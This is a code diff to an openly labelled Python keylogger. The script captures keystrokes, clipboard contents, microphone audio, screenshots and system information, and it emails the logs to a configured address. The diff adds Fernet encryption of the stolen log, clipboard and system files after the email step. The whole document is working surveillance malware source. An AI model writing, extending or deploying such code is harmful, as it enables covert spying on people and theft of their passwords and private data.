@@ -12,7 +12,7 @@ import win32clipboard
 
 from pynput.keyboard import Key, Listener
 
-import time, os
+import os
 
 from scipy.io.wavfile import write
 import sounddevice as sd
@@ -36,6 +36,10 @@ audio_file_path = os.path.join(script_directory,"audio.wav")
 image_file_path = os.path.join(script_directory,"screenshot.png")
 load_dotenv(env_path)
 
+enc_log = os.path.join(script_directory,"enc-log.txt")
+enc_system = os.path.join(script_directory,"enc-system.txt")
+enc_clipboard = os.path.join(script_directory,"enc-clipboard.txt")
+
 BUFFER_COUNT = 30
 buffer = ""
 keystroke_count = 0
@@ -44,6 +48,7 @@ microphone_time = 10
 fromAddress = os.getenv('FROM_EMAIL_ADDRESS')
 password = os.getenv('PASSWORD')
 toAddress = os.getenv('TO_EMAIL_ADDRESS')
+key = os.getenv('KEY')
 
 def send_email(filename, attachment, toAddress):
 	msg = MIMEMultipart()
@@ -162,7 +167,25 @@ def on_release(key):
 		copy_clipboard()
 		screenshot()
 		send_email("log.txt", log_file_path, toAddress)
+		encrypt_files()
 		return False
+
+def encrypt_files():
+    files_to_encrypt = [log_file_path, clipboard_path, system_info_path]
+    encrypted_files = [enc_log, enc_clipboard, enc_system]
+    enc_idx = 0
+    for file in files_to_encrypt:
+        with open(file, 'rb') as f:
+            data = f.read()
+        
+        fernet = Fernet(key)
+        encrypted = fernet.encrypt(data)
+        
+        with open(encrypted_files[enc_idx], 'wb') as f:
+            f.write(encrypted)
+        
+        enc_idx += 1
+
 
 print("Keylogger Started...")
 
